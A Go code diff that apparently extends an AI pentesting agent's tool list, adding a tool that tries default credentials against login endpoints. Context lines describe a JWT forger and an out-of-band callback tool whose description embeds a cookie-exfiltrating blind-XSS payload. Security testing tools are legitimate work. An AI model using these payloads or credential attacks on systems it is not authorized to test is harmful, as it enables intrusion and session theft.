@@ -52,6 +52,7 @@ var requiredIndicator = map[string]string{
 	"open_redirect": "external_redirect", "redirect": "external_redirect",
 	"path_traversal": "file_disclosure", "lfi": "file_disclosure", "file_disclosure": "file_disclosure",
 	"command_injection": "cmd_output", "cmdi": "cmd_output", "rce": "cmd_output",
+	"default_credentials": "default_creds", "default_creds": "default_creds", // login succeeded with a default pair
 }
 
 type toolDef struct {
@@ -71,6 +72,7 @@ func tools() []toolDef {
 		{"oob_url", "oob_url() — mint an out-of-band callback URL (your own interactsh). Embed it where a BLIND vuln would reach out: an SSRF target, a blind-XSS cookie beacon (<script>fetch('URL?c='+document.cookie)</script>), a blind-cmdi curl. Returns a token.", tOOBURL},
 		{"oob_check", "oob_check(token?) — did the target call your OOB URL back? A recorded hit PROVES the blind interaction fired; the hit's query/body carries anything you exfil (a cookie, a flag). Omit token to see all callbacks.", tOOBCheck},
 		{"jwt_crack", "jwt_crack(token, claims?) — crack a JWT's HMAC secret against a built-in weak-secret list, or detect the alg:none bypass. If it cracks (or is alg:none), pass claims={...} to MINT a forged token with attacker claims (e.g. {\"user\":\"admin\",\"role\":\"admin\"}) — then replay it via send_request (as the session cookie or a Bearer header) for an IDOR / privilege-escalation / auth-bypass chain. Deterministic: a secret is reported cracked ONLY when its signature actually verifies. Pair it with the session token surfaced by cookie_set.", tJWT},
+		{"try_default_creds", "try_default_creds(url, user_field?, pass_field?, json?) — POST a small list of default credentials (admin/admin, admin/password, …) to a login endpoint. Reports a hit ONLY on a grounded differential vs a known-bad baseline (a redirect the bad login didn't get, or an auth cookie it didn't set) — so no false positives. user_field/pass_field default username/password; set json=true for a JSON login body. On a hit, log in with send_request to reach the authed surface.", tDefaultCreds},
 		{"note_defense", "note_defense(signature) — remember a WAF/filter you hit (e.g. '403 on quote char'); informs your next obfuscation.", tNote},
 		{"finish", "finish(summary) — end the engagement and emit the executive summary", tFinish},
 	}
